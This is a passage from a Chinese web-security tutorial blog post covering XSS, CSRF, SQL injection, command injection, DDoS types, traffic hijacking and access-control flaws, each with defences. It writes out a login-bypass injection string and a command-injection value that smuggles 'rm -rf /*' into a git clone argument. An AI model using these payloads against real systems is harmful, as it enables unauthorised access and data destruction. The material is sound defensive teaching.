XSS"></a>基于 Flash 的跨站 XSS</h4><p>基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，虽然现在开发 ActionScript 的产品线几乎没有了，但还是提一句吧，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。</p><p>避免方法：</p><ul><li>严格管理 cookie 的读写权限</li><li>对 Flash 能接受用户输入的参数进行过滤 escape 转义处理</li></ul><h4 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h4><p>有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。</p><p>这时候需要通过以下方式来防止这类漏洞：</p><ul><li>对待跳转的 URL 参数做白名单或者某种规则过滤</li><li>后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF（Cross-Site Request Forgery），中文名称：跨站请求伪造攻击</p><p>那么 CSRF 到底能够干嘛呢？你可以这样简单的理解：攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求。攻击者只要借助少许的社会工程学的诡计，例如通过 QQ 等聊天软件发送的链接(有些还伪装成短域名，用户无法分辨)，攻击者就能迫使 Web 应用的用户去执行攻击者预设的操作。例如，当用户登录网络银行去查看其存款余额，在他没有退出时，就点击了一个 QQ 好友发来的链接，那么该用户银行帐户中的资金就有可能被转移到攻击者指定的帐户中。</p><p>所以遇到 CSRF 攻击时，将对终端用户的数据和操作指令构成严重的威胁。当受攻击的终端用户具有管理员帐户的时候，CSRF 攻击将危及整个 Web 应用程序。</p><h4 id="CSRF-原理"><a href="#CSRF-原理" class="headerlink" title="CSRF 原理"></a>CSRF 原理</h4><p>下图大概描述了 CSRF 攻击的原理，可以理解为有一个小偷在你配钥匙的地方得到了你家的钥匙，然后拿着要是去你家想偷什么偷什么。</p><img src="/2019/05/10/2019-05-10-常见Web安全攻防总结/pic2.jpg"><p>完成 CSRF 攻击必须要有三个条件：</p><ul><li>用户已经登录了站点 A，并在本地记录了 cookie</li><li>在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。</li><li>站点 A 没有做任何 CSRF 防御</li></ul><p>你也许会问：「如果我不满足以上三个条件中的任意一个，就不会受到 CSRF 的攻击」。其实可以这么说的，但你不能保证以下情况不会发生：</p><ul><li>你不能保证你登录了一个网站后，不再打开一个 tab 页面并访问另外的网站，特别现在浏览器都是支持多 tab 的。</li><li>你不能保证你关闭浏览器了后，你本地的 cookie 立刻过期，你上次的会话已经结束。</li><li>上图中所谓的攻击网站 B，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</li></ul><h4 id="预防-CSRF"><a href="#预防-CSRF" class="headerlink" title="预防 CSRF"></a>预防 CSRF</h4><p>CSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。服务端的预防 CSRF 攻击的方式方法有多种，但思路上都是差不多的，主要从以下两个方面入手：</p><ul><li>正确使用 GET，POST 请求和 cookie</li><li>在非 GET 请求中增加 token</li></ul><p>一般而言，普通的 Web 应用都是以 GET、POST 请求为主，还有一种请求是 cookie 方式。我们一般都是按照如下规则设计应用的请求：</p><ul><li>GET 请求常用在查看，列举，展示等不需要改变资源属性的时候（数据库 query 查询的时候）</li><li>POST 请求常用在 From 表单提交，改变一个资源的属性或者做其他一些事情的时候（数据库有 insert、update、delete 的时候）</li></ul><p>当正确的使用了 GET 和 POST 请求之后，剩下的就是在非 GET 方式的请求中增加随机数，这个大概有三种方式来进行：</p><ul><li><strong>为每个用户生成一个唯一的 cookie token</strong>，所有表单都包含同一个伪随机值，这种方案最简单，因为攻击者不能获得第三方的 cookie(理论上)，所以表单中的数据也就构造失败，但是由于用户的 cookie 很容易由于网站的 XSS 漏洞而被盗取，所以这个方案必须要在没有 XSS 的情况下才安全。</li><li><strong>每个 POST 请求使用验证码</strong>，这个方案算是比较完美的，但是需要用户多次输入验证码，用户体验比较差，所以不适合在业务中大量运用。</li><li><strong>渲染表单的时候，为每一个表单包含一个 csrfToken</strong>，提交表单的时候，带上 csrfToken，然后在后端做 csrfToken 验证。</li></ul><p>CSRF 的防御可以根据应用场景的不同自行选择。CSRF 的防御工作确实会在正常业务逻辑的基础上带来很多额外的开发量，但是这种工作量是值得的，毕竟用户隐私以及财产安全是产品最基础的根本。</p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>SQL 注入漏洞（SQL Injection）是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p><p>而造成 SQL 注入的原因是因为程序没有有效的转义过滤用户的输入，使攻击者成功的向服务器提交恶意的 SQL 查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。</p><p>很多 Web 开发者没有意识到 SQL 查询是可以被篡改的，从而把 SQL 查询当作可信任的命令。殊不知，SQL 查询是可以绕开访问控制，从而绕过身份验证和权限检查的。更有甚者，有可能通过 SQL 查询去运行主机系统级的命令。</p><h4 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h4><p>下面将通过一些真实的例子来详细讲解 SQL 注入的方式的原理。</p><p>考虑以下简单的管理员登录表单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/login&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>后端的 SQL 语句可能是如下这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let querySQL = `</span><br><span class="line">    SELECT *</span><br><span class="line">    FROM user</span><br><span class="line">    WHERE username=&apos;$&#123;username&#125;&apos;</span><br><span class="line">    AND psw=&apos;$&#123;password&#125;&apos;</span><br><span class="line">`;</span><br><span class="line">// 接下来就是执行 sql 语句...</span><br></pre></td></tr></table></figure><p>目的就是来验证用户名和密码是不是正确，按理说乍一看上面的 SQL 语句也没什么毛病，确实是能够达到我们的目的，可是你只是站在用户会老老实实按照你的设计来输入的角度来看问题，如果有一个恶意攻击者输入的用户名是 <strong>zoumiaojiang’ OR 1 = 1 –</strong>，密码随意输入，就可以直接登入系统了。WFT!</p><p>冷静下来思考一下，我们之前预想的真实 SQL 语句是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE username=&apos;zoumiaojiang&apos; AND psw=&apos;mypassword&apos;</span><br></pre></td></tr></table></figure><p>可以恶意攻击者的奇怪用户名将你的 SQL 语句变成了如下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE username=&apos;zoumiaojiang&apos; OR 1 = 1 --&apos; AND psw=&apos;xxxx&apos;</span><br></pre></td></tr></table></figure><p>在 SQL 中，– 是注释后面的内容的意思，所以查询语句就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE username=&apos;zoumiaojiang&apos; OR 1 = 1</span><br></pre></td></tr></table></figure><p>这条 SQL 语句的查询条件永远为真，所以意思就是恶意攻击者不用我的密码，就可以登录进我的账号，然后可以在里面为所欲为，然而这还只是最简单的注入，牛逼的 SQL 注入高手甚至可以通过 SQL 查询去运行主机系统级的命令，将你主机里的内容一览无余，这里我也没有这个能力讲解的太深入，毕竟不是专业研究这类攻击的，但是通过以上的例子，已经了解了 SQL 注入的原理，我们基本已经能找到防御 SQL 注入的方案了。</p><h4 id="如何预防-SQL-注入"><a href="#如何预防-SQL-注入" class="headerlink" title="如何预防 SQL 注入"></a>如何预防 SQL 注入</h4><p>防止 SQL 注入主要是不能允许用户输入的内容影响正常的 SQL 语句的逻辑，当用户的输入信心将要用来拼接 SQL 语句的话，我们应该永远选择不相信，任何内容都必须进行转义过滤，当然做到这个还是不够的，下面列出防御 SQL 注入的几点注意事项：</p><ul><li>严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害</li><li>后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。</li><li>对进入数据库的特殊字符（<strong>‘</strong>，<strong>“</strong>，<strong>\</strong>，<strong>&lt;</strong>，<strong>&gt;</strong>，<strong>&amp;</strong>，<strong>*</strong>，<strong>;</strong> 等）进行转义处理，或编码转换。基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 <strong>lodash._escapehtmlchar</strong> 库。</li><li>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 <strong>query</strong> 方法中的 <strong>?</strong> 占位参数。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.query(`SELECT * FROM user WHERE username = ? AND psw = ?`, [username, psw]);</span><br></pre></td></tr></table></figure><ul><li><strong>在应用发布之前建议使用专业的 SQL 注入检测工具进行检测</strong>，以及时修补被发现的 SQL 注入漏洞。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。</li><li><strong>避免网站打印出 SQL 错误信息</strong>，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。</li><li><strong>不要过于细化返回的错误信息</strong>，如果目的是方便调试，就去使用后端日志，不要在接口上过多的暴露出错信息，毕竟真正的用户不关心太多的技术细节，只要话术合理就行。</li></ul><p>碰到要操作的数据库的代码，一定要慎重，小心使得万年船，多找几个人多来几次 code review，将问题都暴露出来，而且要善于利用工具，操作数据库相关的代码属于机密，没事不要去各种论坛晒自家站点的 SQL 语句，万一被人盯上了呢？</p><h3 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a>命令行注入</h3><p>命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令，听起来好像匪夷所思，这往往是 Web 开发者最容易忽视但是却是最危险的一个漏洞之一，看一个实例：</p><p>假如现在需要实现一个需求：用户提交一些内容到服务器，然后在服务器执行一些系统命令去产出一个结果返回给用户，接口的部分实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span><br><span class="line">const exec = require(&apos;mz/child_process&apos;).exec;</span><br><span class="line">let params = &#123;/* 用户输入的参数 */&#125;;</span><br><span class="line"></span><br><span class="line">exec(`git clone $&#123;params.repo&#125; /some/path`);</span><br></pre></td></tr></table></figure><p>这段代码确实能够满足业务需求，正常的用户也确实能从指定的 git repo 上下载到想要的代码，可是和 SQL 注入一样，这段代码在恶意攻击者眼中，简直就是香饽饽。</p><p>如果 <strong>params.repo</strong> 传入的是 <strong><a href="https://github.com/zoumiaojiang/zoumiaojiang.github.io.git" target="_blank" rel="noopener">https://github.com/zoumiaojiang/zoumiaojiang.github.io.git</a></strong> 当然没问题了。<br>可是如果 params.repo 传入的是 <strong><a href="https://github.com/xx/xx.git" target="_blank" rel="noopener">https://github.com/xx/xx.git</a> &amp;&amp; rm -rf /* &amp;&amp;</strong> 恰好你的服务是用 root 权限起的就惨了。</p><p>具体恶意攻击者能用命令行注入干什么也像 SQL 注入一样，手法是千变万化的，比如「<a href="https://wiki.bash-hackers.org/howto/redirection_tutorial" target="_blank" rel="noopener">反弹 shell 注入</a>」等，但原理都是一样的，我们绝对有能力防止命令行注入发生。防止命令行注入需要做到以下几件事情：</p><ul><li>后端对前端提交内容需要完全选择不相信，并且对其进行规则限制（比如正则表达式）。</li><li>在调用系统命令前对所有传入参数进行命令行参数转义过滤。</li><li>不要直接拼接命令语句，借助一些工具做拼接、转义预处理，例如 Node.js 的 shell-escape npm 包。</li></ul><p>还是前面的例子，我们可以做到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const exec = require(&apos;mz/child_process&apos;).exec;</span><br><span class="line"></span><br><span class="line">// 借助 shell-escape npm 包解决参数转义过滤问题</span><br><span class="line">const shellescape = require(&apos;shell-escape&apos;);</span><br><span class="line"></span><br><span class="line">let params = &#123;/* 用户输入的参数 */&#125;;</span><br><span class="line"></span><br><span class="line">// 先过滤一下参数，让参数符合预期</span><br><span class="line">if (!/正确的表达式/.test(params.repo)) &#123;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let cmd = shellescape([</span><br><span class="line">    &apos;git&apos;,</span><br><span class="line">    &apos;clone&apos;,</span><br><span class="line">    params.repo,</span><br><span class="line">    &apos;/some/path&apos;</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">// cmd 的值: git clone &apos;https://github.com/xx/xx.git &amp;&amp; rm -rf / &amp;&amp;&apos; /some/path</span><br><span class="line">// 这样就不会被注入成功了。</span><br><span class="line">exec(cmd);</span><br></pre></td></tr></table></figure><blockquote><p>无论是在何种后端语言环境中，凡是涉及到代码调用系统 shell 命令的时候都一定要谨慎。</p></blockquote><h3 id="DDoS-攻击"><a href="#DDoS-攻击" class="headerlink" title="DDoS 攻击"></a>DDoS 攻击</h3><p>DDoS 又叫分布式拒绝服务，全称 Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用，这个攻击应该不能算是安全问题，这应该算是一个另类的存在，因为这种攻击根本就是耍流氓的存在，「伤敌一千，自损八百」的行为。出于保护 Web App 不受攻击的攻防角度，还是介绍一下 DDoS 攻击吧，毕竟也是挺常见的。</p><p>DDoS 攻击可以理解为：「你开了一家店，隔壁家点看不惯，就雇了一大堆黑社会人员进你店里干坐着，也不消费，其他客人也进不来，导致你营业惨淡」。为啥说 DDoS 是个「伤敌一千，自损八百」的行为呢？毕竟隔壁店还是花了不少钱雇黑社会但是啥也没得到不是？DDoS 攻击的目的基本上就以下几个：</p><ul><li>深仇大恨，就是要干死你</li><li>敲诈你，不给钱就干你</li><li>忽悠你，不买我防火墙服务就会有“人”继续干你</li></ul><p>也许你的站点遭受过 DDoS 攻击，具体什么原因怎么解读见仁见智。DDos 攻击从层次上可分为网络层攻击与应用层攻击，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。</p><h4 id="网络层-DDoS"><a href="#网络层-DDoS" class="headerlink" title="网络层 DDoS"></a>网络层 DDoS</h4><p>网络层 DDos 攻击包括 <strong>SYN Flood</strong>、<strong>ACK Flood</strong>、<strong>UDP Flood</strong>、<strong>ICMP Flood</strong> 等。</p><h5 id="SYN-Flood-攻击"><a href="#SYN-Flood-攻击" class="headerlink" title="SYN Flood 攻击"></a>SYN Flood 攻击</h5><p>SYN flood 攻击主要利用了 TCP 三次握手过程中的 Bug，我们都知道 TCP 三次握手过程是要建立连接的双方发送 SYN，SYN + ACK，ACK 数据包，而当攻击方随意构造源 IP 去发送 SYN 包时，服务器返回的 SYN + ACK 就不能得到应答（因为 IP 是随意构造的），此时服务器就会尝试重新发送，并且会有至少 30s 的等待时间，导致资源饱和服务不可用，此攻击属于慢型 DDoS 攻击。</p><h5 id="ACK-Flood-攻击"><a href="#ACK-Flood-攻击" class="headerlink" title="ACK Flood 攻击"></a>ACK Flood 攻击</h5><p>ACK Flood 攻击是在 TCP 连接建立之后，所有的数据传输 TCP 报文都是带有 ACK 标志位的，主机在接收到一个带有 ACK 标志位的数据包的时候，需要检查该数据包所表示的连接四元组是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。如果在检查中发现该数据包不合法，例如该数据包所指向的目的端口在本机并未开放，则主机操作系统协议栈会回应 RST 包告诉对方此端口不存在。</p><h5 id="UDP-Flood-攻击"><a href="#UDP-Flood-攻击" class="headerlink" title="UDP Flood 攻击"></a>UDP Flood 攻击</h5><p>UDP flood 攻击是由于 UDP 是一种无连接的协议，因此攻击者可以伪造大量的源 IP 地址去发送 UDP 包，此种攻击属于大流量攻击。正常应用情况下，UDP 包双向流量会基本相等，因此发起这种攻击的攻击者在消耗对方资源的时候也在消耗自己的资源。</p><h5 id="ICMP-Flood-攻击"><a href="#ICMP-Flood-攻击" class="headerlink" title="ICMP Flood 攻击"></a>ICMP Flood 攻击</h5><p>ICMP Flood 攻击属于大流量攻击，其原理就是不断发送不正常的 ICMP 包（所谓不正常就是 ICMP 包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。目前很多服务器都是禁 ping 的（在防火墙在可以屏蔽 ICMP 包），因此这种攻击方式已经落伍。</p><h4 id="网络层-DDoS-防御"><a href="#网络层-DDoS-防御" class="headerlink" title="网络层 DDoS 防御"></a>网络层 DDoS 防御</h4><p>网络层的 DDoS 攻击究其本质其实是无法防御的，我们能做得就是不断优化服务本身部署的网络架构，以及提升网络带宽。当然，还是做好以下几件事也是有助于缓解网络层 DDoS 攻击的冲击：</p><ul><li>网络架构上做好优化，采用负载均衡分流。</li><li>确保服务器的系统文件是最新的版本，并及时更新系统补丁。</li><li>添加抗 DDos 设备，进行流量清洗。</li><li>限制同时打开的 SYN 半连接数目，缩短 SYN 半连接的 Timeout 时间。</li><li>限制单 IP 请求频率。</li><li>防火墙等防护设置禁止 ICMP 包等。</li><li>严格限制对外开放的服务器的向外访问。</li><li>运行端口映射程序或端口扫描程序，要认真检查特权端口和非特权端口。</li><li>关闭不必要的服务。</li><li>认真检查网络设备和主机/服务器系统的日志。只要日志出现漏洞或是时间变更,那这台机器就可能遭到了攻击。</li><li>限制在防火墙外与网络文件共享。这样会给黑客截取系统文件的机会，主机的信息暴露给黑客，无疑是给了对方入侵的机会。</li><li>加钱堆机器。。</li><li>报警。。</li></ul><h4 id="应用层-DDoS"><a href="#应用层-DDoS" class="headerlink" title="应用层 DDoS"></a>应用层 DDoS</h4><p>应用层 DDoS 攻击不是发生在网络层，是发生在 TCP 建立握手成功之后，应用程序处理请求的时候，现在很多常见的 DDoS 攻击都是应用层攻击。应用层攻击千变万化，目的就是在网络应用曾耗尽你的带宽，下面列出集中典型的攻击类型。</p><h5 id="CC-攻击"><a href="#CC-攻击" class="headerlink" title="CC 攻击"></a>CC 攻击</h5><p>当时绿盟为了防御 DDoS 攻击研发了一款叫做 <strong>Collapasar</strong> 的产品，能够有效的防御 SYN Flood 攻击。黑客为了挑衅，研发了一款 <strong>Challenge Collapasar</strong> 攻击工具（简称 CC）。</p><p>CC 攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送 CC 攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过 CC 攻击，使用爬虫对某些加载需要消耗大量资源的页面发起 HTTP 请求。</p><h5 id="DNS-Flood"><a href="#DNS-Flood" class="headerlink" title="DNS Flood"></a>DNS Flood</h5><p>DNS Flood 攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层 DNS 服务器递归查询域名信息。域名解析的过程给服务器带来了很大的负载，每秒钟域名解析请求超过一定的数量就会造成 DNS 服务器解析域名超时。</p><p>根据微软的统计数据，一台 DNS 服务器所能承受的动态域名查询的上限是每秒钟 9000 个请求。而我们知道，在一台 P3 的 PC 机上可以轻易地构造出每秒钟几万个域名解析请求，足以使一台硬件配置极高的 DNS 服务器瘫痪，由此可见 DNS 服务器的脆弱性。</p><h5 id="HTTP-慢速连接攻击"><a href="#HTTP-慢速连接攻击" class="headerlink" title="HTTP 慢速连接攻击"></a>HTTP 慢速连接攻击</h5><p>针对 HTTP 协议，先建立起 HTTP 连接，设置一个较大的 Conetnt-Length，每次只发送很少的字节，让服务器一直以为 HTTP 头部没有传输完成，这样连接一多就很快会出现连接耗尽。</p><h4 id="应用层-DDoS-防御"><a href="#应用层-DDoS-防御" class="headerlink" title="应用层 DDoS 防御"></a>应用层 DDoS 防御</h4><ul><li>判断 User-Agent 字段（不可靠，因为可以随意构造）</li><li>针对 IP + cookie，限制访问频率（由于 cookie 可以更改，IP 可以使用代理，或者肉鸡，也不可靠)</li><li>关闭服务器最大连接数等，合理配置中间件，缓解 DDoS 攻击。</li><li>请求中添加验证码，比如请求中有数据库操作的时候。</li><li>编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。</li><li>加钱堆机器。。</li><li>报警。。</li></ul><p>应用层的防御有时比网络层的更难，因为导致应用层被 DDoS 攻击的因素非常多，有时往往是因为程序员的失误，导致某个页面加载需要消耗大量资源，有时是因为中间件配置不当等等。而应用层 DDoS 防御的核心就是区分人与机器（爬虫），因为大量的请求不可能是人为的，肯定是机器构造的。因此如果能有效的区分人与爬虫行为，则可以很好地防御此攻击。</p><h4 id="其他-DDoS-攻击"><a href="#其他-DDoS-攻击" class="headerlink" title="其他 DDoS 攻击"></a>其他 DDoS 攻击</h4><p>发起 DDoS 也是需要大量的带宽资源的，但是互联网就像森林，林子大了什么鸟都有，DDoS 攻击者也能找到其他的方式发起廉价并且极具杀伤力的 DDoS 攻击。</p><h5 id="利用-XSS"><a href="#利用-XSS" class="headerlink" title="利用 XSS"></a>利用 XSS</h5><p>举个例子，如果 12306 页面有一个 XSS 持久型漏洞被恶意攻击者发现，只需在春节抢票期间在这个漏洞中执行脚本使得往某一个小站点随便发点什么请求，然后随着用户访问的增多，感染用户增多，被攻击的站点自然就会迅速瘫痪了。这种 DDoS 简直就是无本万利，不用惊讶，现在大站有 XSS 漏洞的不要太多。</p><h5 id="来自-P2P-网络攻击"><a href="#来自-P2P-网络攻击" class="headerlink" title="来自 P2P 网络攻击"></a>来自 P2P 网络攻击</h5><p>大家都知道，互联网上的 P2P 用户和流量都是一个极为庞大的数字。如果他们都去一个指定的地方下载数据，成千上万的真实 IP 地址连接过来，没有哪个设备能够支撑住。拿 BT 下载来说，伪造一些热门视频的种子，发布到搜索引擎，就足以骗到许多用户和流量了，但是这只是基础攻击。<br>高级的 P2P 攻击，是直接欺骗资源管理服务器。如迅雷客户端会把自己发现的资源上传到资源管理服务器，然后推送给其它需要下载相同资源的用户，这样，一个链接就发布出去。通过协议逆向，攻击者伪造出大批量的热门资源信息通过资源管理中心分发出去，瞬间就可以传遍整个 P2P 网络。更为恐怖的是，这种攻击是无法停止的，即使是攻击者自身也无法停止，攻击一直持续到 P2P 官方发现问题更新服务器且下载用户重启下载软件为止。</p><blockquote><p>最后总结下，DDoS 不可能防的住，就好比你的店只能容纳 50 人，黑社会有 100 人，你就换一家大店，能容纳 500 人，然后黑社会又找来了 1000 人，这种堆人头的做法就是 DDoS 本质上的攻防之道，「道高一尺，魔高一丈，魔高一尺，道高一丈」，讲真，必要的时候就答应勒索你的人的条件吧，实在不行就报警吧。</p></blockquote><h3 id="流量劫持"><a href="#流量劫持" class="headerlink" title="流量劫持"></a>流量劫持</h3><p>流量劫持应该算是黑产行业的一大经济支柱了吧？简直是让人恶心到吐，不吐槽了，还是继续谈干货吧，流量劫持基本分两种：DNS 劫持 和 HTTP 劫持，目的都是一样的，就是当用户访问 zoumiaojiang.com 的时候，给你展示的并不是或者不完全是 zoumiaojiang.com 提供的 “内容”。</p><h4 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h4><p>DNS 劫持，也叫做域名劫持，可以这么理解，「你打了一辆车想去商场吃饭，结果你打的车是小作坊派来的，直接给你拉到小作坊去了」，DNS 的作用是把网络地址域名对应到真实的计算机能够识别的 IP 地址，以便计算机能够进一步通信，传递网址和内容等。如果当用户通过某一个域名访问一个站点的时候，被篡改的 DNS 服务器返回的是一个恶意的钓鱼站点的 IP，用户就被劫持到了恶意钓鱼站点，然后继而会被钓鱼输入各种账号密码信息，泄漏隐私。</p><p>这类劫持，要不就是网络运营商搞的鬼，一般小的网络运营商与黑产勾结会劫持 DNS，要不就是电脑中毒，被恶意篡改了路由器的 DNS 配置，基本上做为开发者或站长却是很难察觉的，除非有用户反馈，现在升级版的 DNS 劫持还可以对特定用户、特定区域等使用了用户画像进行筛选用户劫持的办法，另外这类广告显示更加随机更小，一般站长除非用户投诉否则很难觉察到，就算觉察到了取证举报更难。无论如何，如果接到有 DNS 劫持的反馈，一定要做好以下几件事：</p><ul><li>取证很重要，时间、地点、IP、拨号账户、截屏、URL 地址等一定要有。</li><li>可以跟劫持区域的电信运营商进行投诉反馈。</li><li>如果投诉反馈无效，直接去工信部投诉，一般来说会加白你的域名。</li></ul><h4 id="HTTP-劫持"><a href="#HTTP-劫持" class="headerlink" title="HTTP 劫持"></a>HTTP 劫持</h4><p>HTTP 劫持您可以这么理解，「<strong>你打了一辆车想去商场吃饭，结果司机跟你一路给你递小作坊的广告</strong>」，HTTP 劫持主要是当用户访问某个站点的时候会经过运营商网络，而不法运营商和黑产勾结能够截获 HTTP 请求返回内容，并且能够篡改内容，然后再返回给用户，从而实现劫持页面，轻则插入小广告，重则直接篡改成钓鱼网站页面骗用户隐私。能够实施流量劫持的根本原因，是 HTTP 协议没有办法对通信对方的身份进行校验以及对数据完整性进行校验。如果能解决这个问题，则流量劫持将无法轻易发生。所以防止 HTTP 劫持的方法只有将内容加密，让劫持者无法破解篡改，这样就可以防止 HTTP 劫持了。</p><p>HTTPS 协议就是一种基于 SSL 协议的安全加密网络应用层协议，可以很好的防止 HTTP 劫持。这里有篇 文章 讲的不错。HTTPS 在这就不深讲了，后面有机会我会单独好好讲讲 HTTPS。如果不想站点被 HTTP 劫持，赶紧将你的站点全站改造成 HTTPS 吧。</p><h3 id="服务器漏洞"><a href="#服务器漏洞" class="headerlink" title="服务器漏洞"></a>服务器漏洞</h3><p>服务器除了以上提到的那些大名鼎鼎的漏洞和臭名昭著的攻击以外，其实还有很多其他的漏洞，往往也很容易被忽视，在这个小节也稍微介绍几种。</p><h4 id="越权操作漏洞"><a href="#越权操作漏洞" class="headerlink" title="越权操作漏洞"></a>越权操作漏洞</h4><p>如果你的系统是有登录控制的，那就要格外小心了，因为很有可能你的系统越权操作漏洞，越权操作漏洞可以简单的总结为 「A 用户能看到或者操作 B 用户的隐私内容」，如果你的系统中还有权限控制就更加需要小心了。所以每一个请求都需要做 userid 的判断</p><p>以下是一段有漏洞的后端示意代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// ctx 为请求的 context 上下文</span><br><span class="line">let msgId = ctx.params.msgId;</span><br><span class="line"></span><br><span class="line">mysql.query(</span><br><span class="line">    &apos;SELECT * FROM msg_table WHERE msg_id = ?&apos;,</span><br><span class="line">    [msgId]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>以上代码是任何人都可以查询到任何用户的消息，只要有 msg_id 就可以，这就是比较典型的越权漏洞，需要如下这么改进一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// ctx 为请求的 context 上下文</span><br><span class="line">let msgId = ctx.params.msgId;</span><br><span class="line">let userId = ctx.session.userId; // 从会话中取出当前登陆的 userId</span><br><span class="line"></span><br><span class="line">mysql.query(</span><br><span class="line">    &apos;SELECT * FROM msg_table WHERE msg_id = ? AND user_id = ?&apos;,</span><br><span class="line">    [msgId, userId]</span><br><span 